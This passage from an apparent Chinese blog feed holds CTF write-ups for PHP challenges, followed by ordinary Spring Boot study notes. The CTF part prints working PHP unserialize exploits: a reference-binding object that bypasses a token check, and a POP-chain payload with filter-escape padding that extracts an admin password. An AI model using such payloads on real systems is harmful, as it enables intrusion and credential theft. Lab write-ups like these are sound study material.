punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">=</span><span class="token variable">$t</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">===</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$sxsec</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sxsec'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sxsec</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$sxsec</span> <span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"NO"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>  看到题目是unserialize,需要serialize一下</p></li><li><p>```php</p>  <?php  class Sxsec{      public $token='lin';      public $password;      public function __construct($t,$p){      $this->token=&$this->password;  }  }  $pop=new Sxsec();  echo urlencode(serialize($pop));  ?>  <pre class="line-numbers language-none"><code class="language-none">3.   得到4.   &#96;&#96;&#96;php     O%3A5%3A%22Sxsec%22%3A2%3A%7Bs%3A5%3A%22token%22%3BN%3Bs%3A8%3A%22password%22%3BR%3A2%3B%7D&amp;a[]&#x3D;a&amp;b[]&#x3D;b&amp;c&#x3D;0e215962017<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  get传参传给sxsec即可获得flag</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903195743.png"></p></li></ol><h1 id="40300"><a href="#40300" class="headerlink" title="40300"></a>40300</h1><ol><li>  try to flag.txt</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903195821.png"></li><li>  在url后面拼接flag.txt</li><li>  访问得到flag</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903195923.png"></li></ol><h1 id="40315"><a href="#40315" class="headerlink" title="40315"></a>40315</h1><ol><li><p>第一步：打开网页，dirsearch扫到了<a href="http://www.zip审计源码,有个safe方法可以进行字符逃逸/">www.zip审计源码,有个safe方法可以进行字符逃逸</a></p>  <pre class="line-numbers language-none"><code class="language-none">function safe($parm)&#123;    $array&#x3D; array(&#39;union&#39;,&#39;regexp&#39;,&#39;load&#39;,&#39;into&#39;,&#39;flag&#39;,&#39;file&#39;,&#39;insert&#39;,&quot;&#39;&quot;,&#39;\\&#39;,&quot;*&quot;,&quot;alter&quot;);    return str_replace($array,&#39;hacker&#39;,$parm);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>第二步：</p><p>  寻找pop链，可以利用UpdateHelper的__destruct触发User的__toString然后走到Info的__call方法，在__call中调用了dbCtrl类的login方法，通过控制查询语句，把admin账户的密码查出来</p>  <pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php class *User* &#123;   public $age='select password,id from user where username=?';   public $nickname=null; &#125; class *Info*&#123;   public $age;   public $nickname;   public $CtrlCase; &#125; class *UpdateHelper* &#123;   public $sql; &#125; class *dbCtrl* &#123;   public $hostname = "127.0.0.1";   public $dbuser="noob123";   public $dbpass="noob123";   public $database="noob123";   public $name='admin';   public $token = 'admin'; &#125; function post($data)&#123;   $data = http_build_query($data);   $opts = array (     'http' => array (       'method' => 'POST',       'header'=> "Content-type: application/x-www-form-urlencoded\r\n" .         "Content-Length: " . strlen($data) . "\r\n",       'content' => $data     )   );   $html = file_get_contents('http://127.0.0.1:8085/index.php?action=update', false, stream_context_create($opts));   echo $html; &#125; $x = new UpdateHelper(); $x->sql = new User(); $x->sql->nickname = new Info(); $x->sql->nickname->CtrlCase = new dbCtrl(); $p = '";s:8:"CtrlCase";' . serialize($x) . "&#125;"; $p = str_repeat('union', strlen($p)).$p; echo($p); post([   'age' => 123,   'nickname' => $p ]);```payload:```unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion";s:8:"CtrlCase";O:12:"UpdateHelper":3:&#123;s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:&#123;s:2:"id";N;s:3:"age";s:45:"select password,id from user where username=?";s:8:"nickname";O:4:"Info":3:&#123;s:3:"age";s:0:"";s:8:"nickname";s:1:"1";s:8:"CtrlCase";O:6:"dbCtrl":8:&#123;s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:7:"noob123";s:6:"dbpass";s:7:"noob123";s:8:"database";s:7:"noob123";s:4:"name";s:5:"admin";s:8:"password";N;s:6:"mysqli";N;s:5:"token";s:5:"admin";&#125;&#125;&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903205337.png"></p></li><li><p>  得到密码后，登录得到flag</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903210434.png"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring学习笔记</title>
      <link href="/Spring%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/Spring%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring学习笔记"><a href="#Spring学习笔记" class="headerlink" title="Spring学习笔记"></a>Spring学习笔记</h1><h2 id="一定要区分mapper-service-和controller"><a href="#一定要区分mapper-service-和controller" class="headerlink" title="一定要区分mapper,service,和controller"></a>一定要区分mapper,service,和controller</h2><ol><li>  mapper是用来控制数据库</li><li>  service主要实现业务逻辑</li><li>  controller与前端交互</li></ol><h2 id="MVC模式"><a href="#MVC模式" class="headerlink" title="MVC模式"></a>MVC模式</h2><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903153707.png"></li><li>  controller,view,model分别对应一个文件夹</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903153825.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903154156.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903155227.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903155332.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/2J27OL_GL%7D4N79A2GA5WCZI.png"></li><li></li></ol><h2 id="前端后端，分离不分离的区别"><a href="#前端后端，分离不分离的区别" class="headerlink" title="前端后端，分离不分离的区别"></a>前端后端，分离不分离的区别</h2><ol><li>  每一个用户操作的就是客户端</li><li>  后端是用spring搭建</li><li>  前端有两个可以搭建的方式：web和app</li><li>  用户打开网页，本质是向服务器发送了一个链接（请求），服务器接收到了请求之后，会返回一个页面，这个页面是以字符串表单的形式返回的，浏览器接收之后会自动转化</li><li>  前后端不分离：客户端发送一个请求，服务端直接返回了一个表单</li><li>  前后端分离：客户端发送一个请求，不会直接调用服务端的数据，而是会从web端返回一个html，css的表单，等到调用的时候才会去调用服务端的数据，图解如下</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220829195453.png"></li></ol><h2 id="MVC模式-1"><a href="#MVC模式-1" class="headerlink" title="MVC模式"></a>MVC模式</h2><ol><li>  每一个链接对应一个函数</li><li>  C：controller,负责向用户返回一个数据的控制器</li><li>  V：视图，html</li><li>  M：model，数据库调用</li></ol><h2 id="创建后端项目"><a href="#创建后端项目" class="headerlink" title="创建后端项目"></a>创建后端项目</h2><ol><li>  在spring initializer中选择<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220829200650.png"></li><li>  选择spring web和thymleaf</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220829200831.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220829200844.png"></li><li>  记住不要初始化git</li></ol><h2 id="Controller"><a href="#Controller" class="headerlink" title="Controller"></a>Controller</h2><ol><li><p>```java<br>  package com.kob.backend.controller.pk;</p><p>  import org.springframework.stereotype.Controller;<br>  import org.springframework.web.bind.annotation.RequestMapping;</p><p>  @Controller<br>  @RequestMapping(value=”/pk/“)//注解的内容详见Java面向对象<br>  public class IndexController {</p><pre><code>  @RequestMapping(&quot;index/&quot;)  public String index()&#123;      return &quot;pk/index.html&quot;; //这个地方返回的是一个路径，所以是String类型  &#125;</code></pre><p>  }</p>  <pre class="line-numbers language-none"><code class="language-none">2.   前端页面添加在templates下创建各自模块的文件夹（注意这个地方是文件夹，而不是package）3.   在类上定义@RequestMapping,提供初步的请求映射信息，相对于Web应用的根目录4.   在方法上定义@RequestMapping,提供进一步的细分信息，相对于类定义处的URL5.   如果对方法不写@RequestMapping的话，则不能访问后面方法中写的return的路径## template1.   template中存放的是html页面## static1.   static中一般创建三个目录，分别是CSS,JS,image## 以上是前后端不分离的写法_______________________# 前后端分离的写法1.   前后端分离，后端只会返回数据2.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220830194938.png)3.   List&lt;String&gt; 数据类型     ## 改端口1.   可以在 **templates** 的 **application.properties** 中修改端口2.   如果使用默认的官方的网址，则properties文件是空的3.   因为vue的默认端口也是8080## JDBC![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220830223222.png)![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220830223651.png)![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220830225133.png)1.   idea中可以查看到数据库的可视化界面## 添加数据库依赖1.   maven仓库官方地址[Just a moment... (mvnrepository.com)](https:&#x2F;&#x2F;mvnrepository.com&#x2F;)2.   第一个spring boot of JDBC(好像是这个名吧)3.   &#96;&#96;&#96;     &lt;!-- https:&#x2F;&#x2F;mvnrepository.com&#x2F;artifact&#x2F;org.springframework.boot&#x2F;spring-boot-starter-jdbc --&gt;     &lt;dependency&gt;         &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;         &lt;artifactId&gt;spring-boot-starter-jdbc&lt;&#x2F;artifactId&gt;         &lt;version&gt;2.7.1&lt;&#x2F;version&gt;     &lt;&#x2F;dependency&gt;     <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  直接复制进pom.xml中</p></li><li><p>  在pom.xml中查询dependencies,添加到dependencies的下一级中，和其它dependeny同级</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220830230121.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220830230135.png"></p></li><li><p>  第二个，Project Lombok</p></li><li><p>```</p>  <!-- https://mvnrepository.com/artifact/org.projectlombok/lombok -->  <dependency>      <groupId>org.projectlombok</groupId>      <artifactId>lombok</artifactId>      <version>1.18.14</version>      <scope>provided</scope>  </dependency>    <pre class="line-numbers language-none"><code class="language-none">10.   MySQL Connector&#x2F;J11.   &#96;&#96;&#96;      &lt;!-- https:&#x2F;&#x2F;mvnrepository.com&#x2F;artifact&#x2F;mysql&#x2F;mysql-connector-java --&gt;      &lt;dependency&gt;          &lt;groupId&gt;mysql&lt;&#x2F;groupId&gt;          &lt;artifactId&gt;mysql-connector-java&lt;&#x2F;artifactId&gt;          &lt;version&gt;8.0.29&lt;&#x2F;version&gt;      &lt;&#x2F;dependency&gt;      <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  mybatis-plus-boot-starter</p></li><li>  <pre class="line-numbers language-none"><code class="language-none">&lt;!-- https:&#x2F;&#x2F;mvnrepository.com&#x2F;artifact&#x2F;com.baomidou&#x2F;mybatis-plus-boot-starter --&gt;&lt;dependency&gt;    &lt;groupId&gt;com.baomidou&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;mybatis-plus-boot-starter&lt;&#x2F;artifactId&gt;    &lt;version&gt;3.5.1&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  mybatis-plus-generator</p></li><li><p>```</p>  <!-- https://mvnrepository.com/artifact/com.baomidou/mybatis-plus-generator -->  <dependency>      <groupId>com.baomidou</groupId>      <artifactId>mybatis-plus-generator</artifactId>      <version>3.5.2</version>  </dependency>    <pre class="line-numbers language-none"><code class="language-none">16.   如果maven报红的话，点击重新加载17.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220830230836.png)18.   spring如果想要访问数据库，则需要和登录mysql一样，输入用户名密码登录19.   在application.properties中添加数据库配置,下面的还需要自行更改20.   我不知道为什么还要每次**重启idea的时候都要重新写上**,否则会报21.   &#96;&#96;&#96;java      Failed to configure a DataSource: &#39;url&#39; attribute is not specified and no embedded datasource could be configured.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>```java<br>  spring.datasource.username=root<br>  spring.datasource.password=123456<br>  spring.datasource.url=jdbc:mysql://localhost:3306/kob?serverTimezone=Asia/Shanghai&amp;useUnicode=true&amp;characterEncoding=utf-8<br>  spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver</p>  <pre class="line-numbers language-none"><code class="language-none">23.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220831142804.png)## SpringBoot中常用模块1.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220831152828.png)2.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220831152901.png)     3.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220831153435.png)### pojo层1.   第一步：将数据库中的表翻译成Java中的class2.   创建一个package，名为pojo,一个表对应一个pojo3.   创建一个class，名为User4.   类中写数据库中对应的数据类型5.   加入注解，自动化生成6.   @Data,这个注解会导入常用的函数7.   @NoArgsConstructor，无参构造函数8.   @AllArgsConstructor，全参构造函数### mapper层1.   第二步是创建mapper层2.   加入@Mapper注解3.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220831162135.png)4.   UserMapper是一个接口，继承自BaseMapper&lt;User&gt;写法固定### service### controller#### controller的定义1.   初步写的时候,controller和service不用分开，等到真正的写业务逻辑的时候再分开2.   在backend.user中创建UserController类3.   加入注解@RestController4.   在这个类中可以实现各种请求查询5.   如果想要只映射get类型的，则为@GetMapping Mapping6.   只映射post类型的映射，则为@PostMapping Mapping7.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220831163835.png)8.   具体详见[春季@GetMapping和@PostMapping与示例 (howtodoinjava.com)](https:&#x2F;&#x2F;howtodoinjava.com&#x2F;spring5&#x2F;webmvc&#x2F;controller-getmapping-postmapping&#x2F;)9.   要用到mapper的话，一定要加上@Autowired的注解10.   &#96;&#96;&#96;java     @Autowired     UserMapper userMapper;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  当声明出一个上一级的变量时，必须使用此注解</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903160545.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903160557.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220831172013.png"></p></li><li><p>  这样可以使用不同的方法来实现不同的查询，具体查看mybatis CRUD接口</p></li></ol><h4 id="controller中用mybatis-plus的自动化方法实现CRUD"><a href="#controller中用mybatis-plus的自动化方法实现CRUD" class="headerlink" title="controller中用mybatis-plus的自动化方法实现CRUD"></a>controller中用mybatis-plus的自动化方法实现CRUD</h4><ol><li><p>  查：</p></li><li><p>```java<br>  @GetMapping(value=”/user/{userId}”) //这个注解，当get传参为userId时，可以调用后面的方法<br>  public User getuser(int userId){ //这个地方，返回值是数据库中的数据，所以返回值类型写表的名字</p><pre><code>  return userMapper.selectById(userId);</code></pre><p>  }</p>  <pre class="line-numbers language-none"><code class="language-none">3.   上面的是从mybatis的官方文档中看的4.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220831173429.png)### mybatis CRUD接口1.   [CRUD 接口 | MyBatis-Plus (baomidou.com)](https:&#x2F;&#x2F;baomidou.com&#x2F;pages&#x2F;49cc81&#x2F;#service-crud-接口)2.   官方文档中的所有语句一般都是要写到return 语句中的，在userMapper中使用，例如3.   &#96;&#96;&#96;java     return userMapper.selectById(userId);     上面的return userMapper.是一定要写的，因为声明的mapper为userMapper<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="Spring-Boot中传参数"><a href="#Spring-Boot中传参数" class="headerlink" title="Spring Boot中传参数"></a>Spring Boot中传参数</h2><ol><li><p>  大括号，中间写参数名称</p></li><li><p>  例如，要get传参，传给XXX</p></li><li><p>```java<br>  @GetMapping(“/user/{userId}”)</p>  <pre class="line-numbers language-none"><code class="language-none">4.   另外，如果需要引用传入的参数的话，则需要使用如下注解5.   &#96;&#96;&#96;java     @PathVariable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220831203551.png"></p></li><li><p>  @PathVariable注解用来修饰参数，放在参数的前面</p></li><li><p>  {id}，大括号中的参数不需要使用 ? 传递，只需要在后面拼接即可</p></li><li><p>  @PathVariable的详解<a href="https://www.baeldung.com/spring-pathvariable">春季@PathVariable注释|贝尔东 (baeldung.com)</a></p></li></ol><h3 id="当出现红色报错时"><a href="#当出现红色报错时" class="headerlink" title="当出现红色报错时"></a>当出现红色报错时</h3><ol><li>  <strong>当遇到can not resolve symbol XXX的时候，首先检查XXX有没有导入进去</strong></li><li>  <strong>例如can not resolve symbol User,就是没有引入第一步写的pojo中的User类</strong></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220831171009.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220831171037.png"></li><li>  当出现红色报错，例如can not resolve symbol XXX的时候，重启</li><li>  <img src="https://img-blog.csdnimg.cn/20200314173108824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTM4NDAwNjY=,size_4,color_FFFFFF,t_70"></li><li>  <img src="https://img-blog.csdnimg.cn/20200314173131448.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTM4NDAwNjY=,size_4,color_FFFFFF,t_70"></li><li>  如果还是报错红色，刷新依赖</li><li>  <img src="https://img-blog.csdnimg.cn/20200314173450227.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTM4NDAwNjY=,size_4,color_FFFFFF,t_70"></li><li>  如果依然报错的话，可以检查<a href="https://so.csdn.net/so/search?q=Maven&spm=1001.2101.3001.7020">Maven</a>的配置，查看Maven的home路径，user setting file路径，local repository的路径。</li></ol><h2 id="springboot在客户端和mysql之间传递的逻辑"><a href="#springboot在客户端和mysql之间传递的逻辑" class="headerlink" title="springboot在客户端和mysql之间传递的逻辑"></a>springboot在客户端和mysql之间传递的逻辑</h2><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220901224026.png"></li><li>  client给spring boot传一个url,spring boot将查询数据返回给mysql</li><li>  mysql将数据返回给spring boot,spring boot再将来自spring boot的数据返回给client</li></ol><h2 id="映射数据库中的表"><a href="#映射数据库中的表" class="headerlink" title="映射数据库中的表"></a>映射数据库中的表</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>kob<span class="token punctuation">.</span>backend<span class="token punctuation">.</span>pojo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">AllArgsConstructor</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">Data</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">NoArgsConstructor</span><span class="token punctuation">;</span><span class="token annotation punctuation">@Data</span><span class="token annotation punctuation">@NoArgsConstructor</span><span class="token annotation punctuation">@AllArgsConstructor</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Kob</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">Integer</span> id<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> username<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> password<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Integer</span> rating<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> photo<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> id<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setId</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> username<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setUsername</span><span class="token punctuation">(</span><span class="token class-name">String</span> username<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getPassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> password<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setPassword</span><span class="token punctuation">(</span><span class="token class-name">String</span> password<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>password <span class="token operator">=</span> password<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getRating</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> rating<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setRating</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> rating<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>rating <span class="token operator">=</span> rating<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getPhoto</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> photo<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setPhoto</span><span class="token punctuation">(</span><span class="token class-name">String</span> photo<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>photo <span class="token operator">=</span> photo<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 